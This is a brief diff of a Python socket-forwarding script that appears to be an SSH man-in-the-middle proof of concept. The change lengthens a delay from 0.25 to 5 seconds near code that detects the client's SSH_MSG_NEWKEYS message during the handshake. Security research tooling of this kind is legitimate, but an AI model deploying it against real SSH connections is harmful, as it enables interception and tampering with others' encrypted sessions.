@@ -68,7 +68,7 @@ def forward_client_to_server(client_socket, server_socket):
             client_data = client_socket.recv(4096)
             if delay_next:
                 delay_next = False
-                sleep(0.25)
+                sleep(5)
             if contains_newkeys(client_data):
                 print("[+] SSH_MSG_NEWKEYS sent by client identified!", flush=True)
                 if len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
